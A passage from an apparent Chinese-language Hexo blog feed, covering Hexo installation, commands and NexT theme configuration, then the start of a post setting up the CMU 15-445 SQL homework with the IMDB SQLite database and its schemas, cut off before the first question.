<p><a href="https://link.zhihu.com/?target=https://www.github.com/ppoffice/hexo-theme-icarus">ppoffice/hexo-theme-icarus</a>, A simple, delicate, and modern theme for the static site generator Hexo., 4.3k</p>
<p><a href="https://link.zhihu.com/?target=https://www.github.com/viosey/hexo-theme-material">viosey/hexo-theme-material</a>, Material Design theme for hexo., 3.9k</p>
<p><a href="https://link.zhihu.com/?target=https://www.github.com/blinkfox/hexo-theme-matery">blinkfox/hexo-theme-matery</a>, A beautiful hexo blog theme with material design and responsive design.一个基于材料设计和响应式设计而成的全面、美观的Hexo主题, 2.9k</p>
<p><a href="https://link.zhihu.com/?target=https://www.github.com/yscoder/hexo-theme-indigo">yscoder/hexo-theme-indigo</a>, 一个Material Design风格的Hexo主题。 <a href="https://link.zhihu.com/?target=https://imys.net/">Yusen’s Blog</a>, 2.7k</p>
<p><a href="https://link.zhihu.com/?target=https://www.github.com/fluid-dev/hexo-theme-fluid">fluid-dev/hexo-theme-fluid</a>,   一款 Material Design 风格的 Hexo 主题 / An elegant Material-Design theme for Hexo, 2.1k</p>
<p><a href="https://link.zhihu.com/?target=https://www.github.com/probberechts/hexo-theme-cactus">probberechts/hexo-theme-cactus</a>,   A responsive, clean and simple theme for Hexo., 1.8k</p>
<p><a href="https://link.zhihu.com/?target=https://www.github.com/pinggod/hexo-theme-apollo">pinggod/hexo-theme-apollo</a>,   a concise hexo theme, 1.8k</p>
<p><a href="https://link.zhihu.com/?target=https://www.github.com/jerryc127/hexo-theme-butterfly">jerryc127/hexo-theme-butterfly</a>,   A Hexo Theme: Butterfly, 1.8k</p>
<p><a href="https://link.zhihu.com/?target=https://www.github.com/LouisBarranqueiro/hexo-theme-tranquilpeak">LouisBarranqueiro/hexo-theme-tranquilpeak</a>,   A gorgeous responsive theme for Hexo blog framework, 1.7k</p>
<p><a href="https://link.zhihu.com/?target=https://www.github.com/Molunerfinn/hexo-theme-melody">Molunerfinn/hexo-theme-melody</a>,  A simple &amp; beautiful &amp; fast theme for Hexo., 1.3k</p>
<p><a href="https://link.zhihu.com/?target=https://www.github.com/ahonn/hexo-theme-even">ahonn/hexo-theme-even</a>,   A super concise theme for Hexo, 1.2k</p>
<p><a href="https://link.zhihu.com/?target=https://www.github.com/fi3ework/hexo-theme-archer">fi3ework/hexo-theme-archer</a>,   A smart and modern theme for Hexo., 1.1k</p>
<p><a href="https://link.zhihu.com/?target=https://www.github.com/ppoffice/hexo-theme-hueman">ppoffice/hexo-theme-hueman</a>, A redesign of Alx’s wordpress theme Hueman, ported to Hexo., 1.1k</p>
<p><a href="https://link.zhihu.com/?target=https://www.github.com/forsigner/fexo">forsigner/fexo</a>, A minimalist design theme for hexo., 1.1k</p>
<p><a href="https://link.zhihu.com/?target=https://www.github.com/wuchong/jacman">wuchong/jacman</a>, Jacman is a fresh looking and responsive theme for Hexo with more features based on Pacman., 1k</p>
<p><a href="https://link.zhihu.com/?target=https://www.github.com/shenliyang/hexo-theme-snippet">shenliyang/hexo-theme-snippet</a>, Snippet 简洁而不简单，也许是一款你寻找已久的hexo主题, 971</p>
<p><a href="https://link.zhihu.com/?target=https://www.github.com/volantis-x/hexo-theme-volantis">volantis-x/hexo-theme-volantis</a>, A Wonderful Theme for Hexo <a href="https://link.zhihu.com/?target=https://volantis.js.org">Volantis</a>, 960</p>
</blockquote>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>前期是基本的<a href="https://hexo.io/zh-cn/docs/">hexo</a>操作，参照官方文档执行。</p>
<h2 id="安装前提"><a href="#安装前提" class="headerlink" title="安装前提"></a>安装前提</h2><p>安装 Hexo 相当简单，只需要先安装下列应用程序即可：</p>
<ul>
<li><a href="http://nodejs.org/">Node.js</a> (Node.js 版本需不低于 10.13，建议使用 Node.js 12.0 及以上版本)</li>
<li><a href="http://git-scm.com/">Git</a></li>
</ul>
<h2 id="安装-Git"><a href="#安装-Git" class="headerlink" title="安装 Git"></a>安装 Git</h2><ul>
<li>Windows：下载并安装 <a href="https://git-scm.com/download/win">git</a>.</li>
<li>Mac：使用 <a href="http://mxcl.github.com/homebrew/">Homebrew</a>, <a href="http://www.macports.org/">MacPorts</a> 或者下载 <a href="http://sourceforge.net/projects/git-osx-installer/">安装程序</a>。</li>
<li>Linux (Ubuntu, Debian)：<code>sudo apt-get install git-core</code></li>
<li>Linux (Fedora, Red Hat, CentOS)：<code>sudo yum install git-core</code></li>
</ul>
<blockquote>
<p>Mac 用户</p>
<p>如果在编译时可能会遇到问题，请先到 App Store 安装 Xcode，Xcode 完成后，启动并进入 <strong>Preferences -&gt; Download -&gt; Command Line Tools -&gt; Install</strong> 安装命令行工具。</p>
</blockquote>
<blockquote>
<p>Windows 用户</p>
<p>对于中国大陆地区用户，可以前往 <a href="https://npm.taobao.org/mirrors/git-for-windows/">淘宝 Git for Windows 镜像</a> 下载 git 安装包。</p>
</blockquote>
<h2 id="安装-Node-js"><a href="#安装-Node-js" class="headerlink" title="安装 Node.js"></a>安装 Node.js</h2><p>Node.js 为大多数平台提供了官方的 <a href="https://nodejs.org/en/download/">安装程序</a>。对于中国大陆地区用户，可以前往 <a href="https://npm.taobao.org/mirrors/node">淘宝 Node.js 镜像</a> 下载。</p>
<p>其它的安装方法：</p>
<ul>
<li>Windows：通过 <a href="https://github.com/jasongin/nvs/">nvs</a>（推荐）或者<a href="https://github.com/nvm-sh/nvm">nvm</a> 安装。</li>
<li>Mac：使用 <a href="https://brew.sh/">Homebrew</a> 或 <a href="http://www.macports.org/">MacPorts</a> 安装。</li>
<li>Linux（DEB/RPM-based）：从 <a href="https://github.com/nodesource/distributions">NodeSource</a> 安装。</li>
<li>其它：使用相应的软件包管理器进行安装，可以参考由 Node.js 提供的 <a href="https://nodejs.org/en/download/package-manager/">指导</a></li>
</ul>
<p>对于 Mac 和 Linux 同样建议使用 nvs 或者 nvm，以避免可能会出现的权限问题。</p>
<blockquote>
<p>Windows 用户</p>
<p>使用 Node.js 官方安装程序时，请确保勾选 <strong>Add to PATH</strong> 选项（默认已勾选）</p>
</blockquote>
<blockquote>
<p>For Mac / Linux 用户</p>
<p>如果在尝试安装 Hexo 的过程中出现 <code>EACCES</code> 权限错误，请遵循 <a href="https://docs.npmjs.com/resolving-eacces-permissions-errors-when-installing-packages-globally">由 npmjs 发布的指导</a> 修复该问题。强烈建议 <strong>不要</strong> 使用 root、sudo 等方法覆盖权限</p>
</blockquote>
<blockquote>
<p>Linux</p>
<p>If you installed Node.js using Snap, you may need to manually run <code>npm install</code> in the target folder when <a href="https://hexo.io/docs/commands#init">initializing</a> a blog.</p>
</blockquote>
<h2 id="安装-Hexo"><a href="#安装-Hexo" class="headerlink" title="安装 Hexo"></a>安装 Hexo</h2><p>所有必备的应用程序安装完成后，即可使用 npm 安装 Hexo。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm install -g hexo-cli</span><br></pre></td></tr></table></figure>
<h2 id="进阶安装和使用"><a href="#进阶安装和使用" class="headerlink" title="进阶安装和使用"></a>进阶安装和使用</h2><p>对于熟悉 npm 的进阶用户，可以仅局部安装 <code>hexo</code> 包。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ npm install hexo</span><br></pre></td></tr></table></figure>
<p>安装以后，可以使用以下两种方式执行 Hexo：</p>
<ol>
<li><p><code>npx hexo &lt;command&gt;</code></p>
</li>
<li><p>将 Hexo 所在的目录下的 <code>node_modules</code> 添加到环境变量之中即可直接使用 <code>hexo &lt;command&gt;</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;PATH&#x3D;&quot;$PATH:.&#x2F;node_modules&#x2F;.bin&quot;&#39; &gt;&gt; ~&#x2F;.profile</span><br></pre></td></tr></table></figure>
<h1 id="基本指令"><a href="#基本指令" class="headerlink" title="基本指令"></a>基本指令</h1></li>
</ol>
<h2 id="init"><a href="#init" class="headerlink" title="init"></a>init</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hexo init [folder]</span><br></pre></td></tr></table></figure>
<p>新建一个网站。如果没有设置 <code>folder</code> ，Hexo 默认在目前的文件夹建立网站。</p>
<p>This command is a shortcut that runs the following steps:</p>
<ol>
<li>Git clone <a href="https://github.com/hexojs/hexo-starter">hexo-starter</a> including <a href="https://github.com/hexojs/hexo-theme-landscape">hexo-theme-landscape</a> into the current directory or a target folder if specified.</li>
<li>Install dependencies using a package manager: <a href="https://classic.yarnpkg.com/lang/en/">Yarn 1</a>, <a href="https://pnpm.js.org/">pnpm</a> or <a href="https://docs.npmjs.com/cli/install">npm</a>, whichever is installed; if there are more than one installed, the priority is as listed. npm is bundled with <a href="https://hexo.io/docs/#Install-Node-js">Node.js</a> by default.</li>
</ol>
<h2 id="new"><a href="#new" class="headerlink" title="new"></a>new</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hexo new [layout] &lt;title&gt;</span><br></pre></td></tr></table></figure>
<p>新建一篇文章。如果没有设置 <code>layout</code> 的话，默认使用 <a href="https://hexo.io/zh-cn/docs/configuration">_config.yml</a> 中的 <code>default_layout</code> 参数代替。如果标题包含空格的话，请使用引号括起来。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hexo new &quot;post title with whitespace&quot;</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>-p</code>, <code>--path</code></td>
<td align="left">自定义新文章的路径</td>
</tr>
<tr>
<td align="left"><code>-r</code>, <code>--replace</code></td>
<td align="left">如果存在同名文章，将其替换</td>
</tr>
<tr>
<td align="left"><code>-s</code>, <code>--slug</code></td>
<td align="left">文章的 Slug，作为新文章的文件名和发布后的 URL</td>
</tr>
</tbody></table>
<p>默认情况下，Hexo 会使用文章的标题来决定文章文件的路径。对于独立页面来说，Hexo 会创建一个以标题为名字的目录，并在目录中放置一个 <code>index.md</code> 文件。你可以使用 <code>--path</code> 参数来覆盖上述行为、自行决定文件的目录：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo new page --path about&#x2F;me &quot;About me&quot;</span><br></pre></td></tr></table></figure>
<p>以上命令会创建一个 <code>source/about/me.md</code> 文件，同时 Front Matter 中的 title 为 <code>&quot;About me&quot;</code></p>
<p>注意！title 是必须指定的！如果你这么做并不能达到你的目的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo new page --path about&#x2F;me</span><br></pre></td></tr></table></figure>
<p>此时 Hexo 会创建 <code>source/_posts/about/me.md</code>，同时 <code>me.md</code> 的 Front Matter 中的 title 为 <code>&quot;page&quot;</code>。这是因为在上述命令中，hexo-cli 将 <code>page</code> 视为指定文章的标题、并采用默认的 <code>layout</code>。</p>
<h2 id="generate"><a href="#generate" class="headerlink" title="generate"></a>generate</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>生成静态文件。</p>
<table>
<thead>
<tr>
<th align="left">选项</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>-d</code>, <code>--deploy</code></td>
<td align="left">文件生成后立即部署网站</td>
</tr>
<tr>
<td align="left"><code>-w</code>, <code>--watch</code></td>
<td align="left">监视文件变动</td>
</tr>
<tr>
<td align="left"><code>-b</code>, <code>--bail</code></td>
<td align="left">生成过程中如果发生任何未处理的异常则抛出异常</td>
</tr>
<tr>
<td align="left"><code>-f</code>, <code>--force</code></td>
<td align="left">强制重新生成文件 Hexo 引入了差分机制，如果 <code>public</code> 目录存在，那么 <code>hexo g</code> 只会重新生成改动的文件。 使用该参数的效果接近 <code>hexo clean &amp;&amp; hexo generate</code></td>
</tr>
<tr>
<td align="left"><code>-c</code>, <code>--concurrency</code></td>
<td align="left">最大同时生成文件的数量，默认无限制</td>
</tr>
</tbody></table>
<p>该命令可以简写为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hexo g</span><br></pre></td></tr></table></figure>
<h2 id="publish"><a href="#publish" class="headerlink" title="publish"></a>publish</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hexo publish [layout] &lt;filename&gt;</span><br></pre></td></tr></table></figure>
<p>发表草稿。</p>
<h2 id="server"><a href="#server" class="headerlink" title="server"></a>server</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>启动服务器。默认情况下，访问网址为： <code>http://localhost:4000/</code>。</p>
<table>
<thead>
<tr>
<th align="left">选项</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>-p</code>, <code>--port</code></td>
<td align="left">重设端口</td>
</tr>
<tr>
<td align="left"><code>-s</code>, <code>--static</code></td>
<td align="left">只使用静态文件</td>
</tr>
<tr>
<td align="left"><code>-l</code>, <code>--log</code></td>
<td align="left">启动日记记录，使用覆盖记录格式</td>
</tr>
</tbody></table>
<h2 id="deploy"><a href="#deploy" class="headerlink" title="deploy"></a>deploy</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>部署网站。</p>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>-g</code>, <code>--generate</code></td>
<td align="left">部署之前预先生成静态文件</td>
</tr>
</tbody></table>
<p>该命令可以简写为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hexo d</span><br></pre></td></tr></table></figure>
<h2 id="render"><a href="#render" class="headerlink" title="render"></a>render</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hexo render &lt;file1&gt; [file2] ...</span><br></pre></td></tr></table></figure>
<p>渲染文件。</p>
<table>
<thead>
<tr>
<th align="left">参数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>-o</code>, <code>--output</code></td>
<td align="left">设置输出路径</td>
</tr>
</tbody></table>
<h2 id="migrate"><a href="#migrate" class="headerlink" title="migrate"></a>migrate</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hexo migrate &lt;type&gt;</span><br></pre></td></tr></table></figure>
<p>从其他博客系统 <a href="https://hexo.io/zh-cn/docs/migration">迁移内容</a>。</p>
<h2 id="clean"><a href="#clean" class="headerlink" title="clean"></a>clean</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hexo clean</span><br></pre></td></tr></table></figure>
<p>清除缓存文件 (<code>db.json</code>) 和已生成的静态文件 (<code>public</code>)。</p>
<p>平时写博客的时候，一般流程是</p>
<ul>
<li><code>hexo new page/post &quot;title&quot;</code> 新建为title的.md文件</li>
<li><code>hexo clean &amp;&amp; hexo s</code> 清楚之前生成的文件，部署到本地服务器</li>
<li><code>hexo g -d</code> 部署到远程服务器</li>
</ul>
<h1 id="next-配置"><a href="#next-配置" class="headerlink" title="next 配置"></a>next 配置</h1><p>next官方中文文档更新比较慢，不少特性和配置没有及时发布，主要参考<a href="https://theme-next.js.org/docs/">英文文档</a>。</p>
<p>传统方式是配置两个文件，一个是站点下，即<code>blog/</code>下的<code>_config.yml</code>文件，称为站点配置文件，另一个是<code>themes/next</code>目录下的<code>_config.yml</code>，称为主题配置文件。</p>
<p>从next7.3.0开始，官方推荐将主题配置文件与主题分离，以便于主题的版本更新。</p>
<p>我们可以将所有主题配置放在一个位置（<code>hexo/source/_data/next.yml</code>）。这样就无需编辑主题配置文件（<code>next/_config.yml</code>）。</p>
<p>具体步骤：</p>
<ol>
<li>在 <code>hexo/source/_data</code> 目录中创建 <code>next.yml</code>（如果<code>_data</code> 不存在，则创建目录）。</li>
<li>在 <code>next.yml</code> 设置 <code>override</code> 选项为 true。</li>
<li>将<strong>所有 NexT 主题选项</strong>从主题配置文件复制到 <code>hexo/source/_data/next.yml</code> 中。</li>
</ol>
<p>然后我们只需要根据自己的需求配置 <code>next.yml</code> 即可。</p>
<h2 id="基本信息配置"><a href="#基本信息配置" class="headerlink" title="基本信息配置"></a>基本信息配置</h2><p>next主题的安装，站点作者、头像、侧边栏的配置参考<a href="https://theme-next.iissnan.com/getting-started.html">文档</a>，</p>
<p>具体站点的部署通过github操作，具体配置参考<a href="https://hexo.io/docs/one-command-deployment">官方文档</a>，在站点<code>blog/_config.yml</code>最后一行配置以下信息： </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: https:&#x2F;&#x2F;github.com&#x2F;twinkle0331&#x2F;twinkle0331.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
<p>更为详细的配置参考<a href="https://hexo.io/docs/configuration.html">官方文档</a>，具体参数和设置里面都很详细。</p>
<h2 id="个性化设置"><a href="#个性化设置" class="headerlink" title="个性化设置"></a>个性化设置</h2><p>设置网页链接为<code>title.html</code>格式而不是<code>2021/03/28/title.html</code>格式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">permalink: :title&#x2F;</span><br></pre></td></tr></table></figure>
<p><em>选择主题为next：</em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">theme: next</span><br></pre></td></tr></table></figure>
<p><em>设置缓存生成模式：</em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Allow to cache content generation.</span><br><span class="line">cache:</span><br><span class="line">  enable: true</span><br><span class="line"></span><br><span class="line"># Remove unnecessary files after hexo generate.</span><br><span class="line">minify: true</span><br></pre></td></tr></table></figure>
<p><em>选择sheme为Mist:</em></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">scheme: Mist</span><br></pre></td></tr></table></figure>
<p>menu显示<code>home、about、tags、categories、archives</code>五栏，之前版本的next需要设定具体对应的中文名，在版本升级后，设定语言后自动更改对应的标签栏。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">menu:</span><br><span class="line">  home: &#x2F; || fa fa-home</span><br><span class="line">  about: &#x2F;about&#x2F; || fa fa-user</span><br><span class="line">  tags: &#x2F;tags&#x2F; || fa fa-tags</span><br><span class="line">  categories: &#x2F;categories&#x2F; || fa fa-th</span><br><span class="line">  archives: &#x2F;archives&#x2F; || fa fa-archive</span><br></pre></td></tr></table></figure>
<h3 id="生成“分类”页并添加tpye属性"><a href="#生成“分类”页并添加tpye属性" class="headerlink" title="生成“分类”页并添加tpye属性"></a>生成“分类”页并添加tpye属性</h3><p>进入博客所在文件夹。执行命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hexo new page categories</span><br></pre></td></tr></table></figure>
<p>成功后会提示：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INFO  Created: ~&#x2F;Documents&#x2F;blog&#x2F;source&#x2F;categories&#x2F;index.md</span><br></pre></td></tr></table></figure>
<p>根据上面的路径，找到<code>index.md</code>这个文件，打开后默认内容是这样的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: 文章分类</span><br><span class="line">date: 2021-03-28 13:47:40</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<p>添加<code>type: &quot;categories&quot;</code>到内容中，添加后是这样的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: 文章分类</span><br><span class="line">date: 2021-03-28 13:47:40</span><br><span class="line">type: &quot;categories&quot;</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<p>保存并关闭文件。</p>
<h3 id="给文章添加“categories”属性"><a href="#给文章添加“categories”属性" class="headerlink" title="给文章添加“categories”属性"></a>给文章添加“categories”属性</h3><p>打开需要添加分类的文章，为其添加categories属性。下方的<code>categories: web前端</code>表示添加这篇文章到“web前端”这个分类。注意：hexo一篇文章只能属于一个分类，也就是说如果在“- web前端”下方添加“-xxx”，hexo不会产生两个分类，而是把分类嵌套（即该文章属于 “- web前端”下的 “-xxx ”分类）。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: jQuery对表单的操作及更多应用</span><br><span class="line">date: 2017-05-26 12:12:57</span><br><span class="line">categories: </span><br><span class="line">- web前端</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<p>至此，点击首页的“分类”可以看到该分类下的所有文章。当然，只有添加了<code>categories: xxx</code>的文章才会被收录到首页的分类标签栏中。</p>
<p>其余属性页面的添加类似</p>
<h3 id="添加本地搜索："><a href="#添加本地搜索：" class="headerlink" title="添加本地搜索："></a>添加本地搜索：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 本地搜索</span><br><span class="line">search:</span><br><span class="line">  path: search.xml</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  limit: 100</span><br><span class="line"></span><br><span class="line">feed:</span><br><span class="line">  type: atom</span><br><span class="line">  path: atom.xml</span><br><span class="line">  limit: 20</span><br><span class="line">  hub:</span><br><span class="line">  content:</span><br><span class="line">  content_limit: 140</span><br><span class="line">  content_limit_delim: &#39; &#39;</span><br><span class="line">  order_by: -date</span><br><span class="line">  icon: icon.png</span><br><span class="line">  autodiscovery: true</span><br><span class="line">  template:</span><br></pre></td></tr></table></figure>
<h3 id="添加代码高亮："><a href="#添加代码高亮：" class="headerlink" title="添加代码高亮："></a>添加代码高亮：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># _config.yml</span><br><span class="line">highlight:</span><br><span class="line">  enable: true</span><br><span class="line">  auto_detect: false</span><br><span class="line">  line_number: true</span><br><span class="line">  tab_replace: &#39;&#39;</span><br><span class="line">  wrap: true</span><br><span class="line">  hljs: false</span><br><span class="line">prismjs:</span><br><span class="line">  enable: false</span><br><span class="line">  preprocess: true</span><br><span class="line">  line_number: true</span><br><span class="line">  tab_replace: &#39;&#39;</span><br></pre></td></tr></table></figure>
<h3 id="设置内容宽度"><a href="#设置内容宽度" class="headerlink" title="设置内容宽度"></a>设置内容宽度</h3><p>打开<code>/themes/next/source/css/_variables/base.styl</code>文件，找到<code>Layout sizes</code>字段修改如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$content-desktop                &#x3D; 70%;</span><br><span class="line">$content-desktop-large          &#x3D; 70%;</span><br><span class="line">$content-desktop-largest        &#x3D; 70%;</span><br></pre></td></tr></table></figure>
<p>由之前的固定像素值更改为比例(画面宽度占屏幕的比例)</p>
]]></content>
      <categories>
        <category>Config</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>blog</tag>
      </tags>
  </entry>
  <entry>
    <title>结构化查询语言SQL</title>
    <url>/database_system/sql/</url>
    <content><![CDATA[<p>之前的关系代数属于过程化语言，同时指定了具体计算过程。关系型语言仅仅指明用户需要什么数据，而不指定具体计算过程，由数据库管理系统负责底层的具体实现。</p>
<p>关系型语言一般由以下几个部分组成：</p>
<ul>
<li>数据定义语言(data definition language)</li>
<li>数据操纵语言(data manipulation language)</li>
<li>数据控制语言(data control language)</li>
</ul>
<p>其中<a href="https://zh.wikipedia.org/wiki/SQL">结构化查询语言SQL</a>广泛使用。</p>
<a id="more"></a>

<p>另外，关系代数基于集合，即无序，无重复，而关系型查询语言基于多集，即无序，允许重复。</p>
<p>以下为<a href="https://15445.courses.cs.cmu.edu/fall2019/homework1/">homework1</a>的解析</p>
<p>homework1中的数据集<a href="https://www.imdb.com/interfaces/">IMDB</a>是一个关于电影、电视节目、电子游戏和电影制作小组的在线数据库。本次howework中的sql由<a href="https://www.sqlite.org/">sqlite</a>实现。</p>
<p>首先创建sql文件，每个sql文件对应于hw中的一个问题。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ mkdir placeholder</span><br><span class="line">$ cd placeholder</span><br><span class="line">$ touch q1_sample.sql \</span><br><span class="line">        q2_uncommon_type.sql \</span><br><span class="line">        q3_tv_vs_movie.sql \</span><br><span class="line">        q4_old_is_not_gold.sql \</span><br><span class="line">        q5_percentage.sql \</span><br><span class="line">        q6_dubbed_smash.sql \</span><br><span class="line">        q7_imdb_250.sql \</span><br><span class="line">        q8_number_of_actors.sql \</span><br><span class="line">        q9_movie_names.sql \</span><br><span class="line">        q10_genre_counts.sql</span><br></pre></td></tr></table></figure>
<p>安装sqlite和libsqlite3-dev</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install sqlite3 libsqlite3-dev</span><br></pre></td></tr></table></figure>
<p>下载imdb数据库压缩包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ wget https:&#x2F;&#x2F;15445.courses.cs.cmu.edu&#x2F;fall2019&#x2F;files&#x2F;imdb-cmudb2019.db.gz</span><br></pre></td></tr></table></figure>
<p>校验md5校验和</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ md5 imdb-cmudb2019.db.gz </span><br><span class="line">MD5 (imdb-cmudb2019.db.gz) &#x3D; 6443351d4b55eb3c881622bd60a8dc5b</span><br></pre></td></tr></table></figure>
<p>解压数据库压缩包并用sqlite打开</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ gunzip imdb-cmudb2019.db.gz</span><br><span class="line">$ sqlite3 imdb-cmudb2019.db</span><br></pre></td></tr></table></figure>
<p>查看数据库中的表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlite&gt; .tables</span><br><span class="line">akas      crew      episodes  people    ratings   titles</span><br></pre></td></tr></table></figure>
<p>为每个表创建索引</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE INDEX ix_people_name ON people (name);</span><br><span class="line">CREATE INDEX ix_titles_type ON titles (type);</span><br><span class="line">CREATE INDEX ix_titles_primary_title ON titles (primary_title);</span><br><span class="line">CREATE INDEX ix_titles_original_title ON titles (original_title);</span><br><span class="line">CREATE INDEX ix_akas_title_id ON akas (title_id);</span><br><span class="line">CREATE INDEX ix_akas_title ON akas (title);</span><br><span class="line">CREATE INDEX ix_crew_title_id ON crew (title_id);</span><br><span class="line">CREATE INDEX ix_crew_person_id ON crew (person_id);</span><br></pre></td></tr></table></figure>
<p>检查数据库模式</p>
<p>people表的属性有身份证号，名字，出生日期，死亡日期，索引为姓名。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlite&gt; .schema people</span><br><span class="line">CREATE TABLE people (</span><br><span class="line">  person_id VARCHAR PRIMARY KEY,</span><br><span class="line">  name VARCHAR,</span><br><span class="line">  born INTEGER,</span><br><span class="line">  died INTEGER</span><br><span class="line">);</span><br><span class="line">CREATE INDEX ix_people_name ON people (name);</span><br></pre></td></tr></table></figure>
<p>其中的一项为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nm0000003|Brigitte Bardot|1934|</span><br></pre></td></tr></table></figure>
<p>title表为电影/电视剧/短视频/视频的具体信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlite&gt; .schema titles</span><br><span class="line">CREATE TABLE titles (</span><br><span class="line">  title_id VARCHAR PRIMARY KEY,</span><br><span class="line">  type VARCHAR,</span><br><span class="line">  primary_title VARCHAR,</span><br><span class="line">  original_title VARCHAR,</span><br><span class="line">  is_adult INTEGER,</span><br><span class="line">  premiered INTEGER,</span><br><span class="line">  ended INTEGER,</span><br><span class="line">  runtime_minutes INTEGER,</span><br><span class="line">  genres VARCHAR</span><br><span class="line">);</span><br><span class="line">CREATE INDEX ix_titles_type ON titles (type);</span><br><span class="line">CREATE INDEX ix_titles_primary_title ON titles (primary_title);</span><br><span class="line">CREATE INDEX ix_titles_original_title ON titles (original_title);</span><br></pre></td></tr></table></figure>
<p>akas表为标题的语言，地区等信息，上映电影在其余国家的信息，标题可能会翻译成上映国家的版本。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE TABLE akas (</span><br><span class="line">  title_id VARCHAR, -- REFERENCES titles (title_id),</span><br><span class="line">  title VARCHAR,</span><br><span class="line">  region VARCHAR,</span><br><span class="line">  language VARCHAR,</span><br><span class="line">  types VARCHAR,</span><br><span class="line">  attributes VARCHAR,</span><br><span class="line">  is_original_title INTEGER</span><br><span class="line">);</span><br><span class="line">CREATE INDEX ix_akas_title_id ON akas (title_id);</span><br><span class="line">CREATE INDEX ix_akas_title ON akas (title);</span><br></pre></td></tr></table></figure>
<p>crew表为某剧对应的人物信息。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE TABLE crew (</span><br><span class="line">  title_id VARCHAR, -- REFERENCES titles (title_id),</span><br><span class="line">  person_id VARCHAR, -- REFERENCES people (person_id),</span><br><span class="line">  category VARCHAR,</span><br><span class="line">  job VARCHAR</span><br><span class="line">);</span><br><span class="line">CREATE INDEX ix_crew_title_id ON crew (title_id);</span><br><span class="line">CREATE INDEX ix_crew_person_id ON crew (person_id);</span><br></pre></td></tr></table></figure>
<p>其中一行的信息为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tt0000003|nm5442194|producer|producer</span><br></pre></td></tr></table></figure>
<p>rating表为对应的id和评分，参与人数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CREATE TABLE ratings (</span><br><span class="line">  title_id VARCHAR PRIMARY KEY, -- REFERENCES titles (title_id),</span><br><span class="line">  rating FLOAT,</span><br><span class="line">  votes INTEGER</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>其中一行的信息为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tt0000001|5.6|1529</span><br></pre></td></tr></table></figure>
<h1 id="q1"><a href="#q1" class="headerlink" title="q1"></a>q1</h1><p>查询titles表中不同类型有哪些</p>
